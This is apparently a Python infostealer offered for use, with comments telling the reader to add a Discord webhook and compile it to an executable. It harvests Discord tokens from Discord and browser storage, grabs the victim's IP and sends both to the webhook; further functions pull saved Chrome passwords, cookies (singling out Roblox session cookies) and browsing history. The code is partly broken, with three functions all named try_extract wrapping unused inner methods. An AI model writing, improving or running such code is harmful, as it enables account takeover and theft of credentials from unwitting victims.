import requests, os, re, sys, shutil, string
from dhooks import Webhook
from winreg import *
import sqlite3
import ntpath

#by yours truly desired
# make a webhook and put it in between the strings.
# once you have put in webhook compile the python file into a .exe file
hook = Webhook("")


def findTokenCookie(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass



def logToken():
    hostname = requests.get("https://api.ipify.org").text
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Google Chromium': local + '\\Chromium\\User Data\\Default',
        'Google Chrome Canary': local + '\\Google\\Chrome SxS\\User Data\\Default',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',

    }



    message = '\n'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += '```'

        tokens = findTokenCookie(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass

        message += '```'
        hook.send(f"IP;\n{hostname}\nTOKEN\n{message}\n logged by desired")
        hook.send()

def try_extract():
    def grabPassword(self):
        f = open(self.dir + '\\Google Passwords.txt', 'w', encoding="cp437", errors='ignore')
        for prof in os.listdir(self.chrome):
            if re.match(self.chrome_reg, prof):
                login_db = ntpath.join(self.chrome, prof, 'Login Data')
                login = self.create_temp_file()

                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")

                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = self.decrypt_val(encrypted_password, self.chrome_key)
                    if url != "":
                        f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")

                cursor.close()
                conn.close()
                os.remove(login)
        f.close()



def try_extract():
    def grabCookies(self):
        f = open(self.dir + '\\Google Cookies.txt', 'w', encoding="cp437", errors='ignore')
        for prof in os.listdir(self.chrome):
            if re.match(self.chrome_reg, prof):
                login_db = ntpath.join(self.chrome, prof, 'Network', 'cookies')
                login = self.create_temp_file()

                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value from cookies")

                for r in cursor.fetchall():
                    host = r[0]
                    user = r[1]
                    decrypted_cookie = self.decrypt_val(r[2], self.chrome_key)
                    if host != "":
                        f.write(f"HOST KEY: {host} | NAME: {user} | VALUE: {decrypted_cookie}\n")
                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                        self.robloxcookies.append(decrypted_cookie)

                cursor.close()
                conn.close()
                os.remove(login)
        f.close()

def try_extract():
    def grabHistory(self):
        f = open(self.dir + '\\Google History.txt', 'w', encoding="cp437", errors='ignore')

        def extract_search_history(db_cursor):
            db_cursor.execute('SELECT term FROM keyword_search_terms')
            search_terms = ""
            for item in db_cursor.fetchall():
                if item[0] != "":
                    search_terms += f"{item[0]}\n"
            return search_terms

        def extract_web_history(db_cursor):
            web = ""
            db_cursor.execute('SELECT title, url, last_visit_time FROM urls')
            for item in db_cursor.fetchall():
                web += f"Title: {item[0]}\nUrl: {item[1]}\nLast Time Visit: {self.convert_time(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"
            return web

        for prof in os.listdir(self.chrome):
            if re.match(self.chrome_reg, prof):
                login_db = ntpath.join(self.chrome, prof, 'History')
                login = self.create_temp_file()

                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()

                search_history = extract_search_history(cursor)
                web_history = extract_web_history(cursor)

                f.write(f"{' '*17}Search History\n{'-'*50}\n{search_history}\n{' '*17}\n\nWeb History\n{'-'*50}\n{web_history}")

                cursor.close()
                conn.close()
                os.remove(login)
        f.close()


if __name__ == '__main__':

    #main process.
    logToken()
    try_extract()
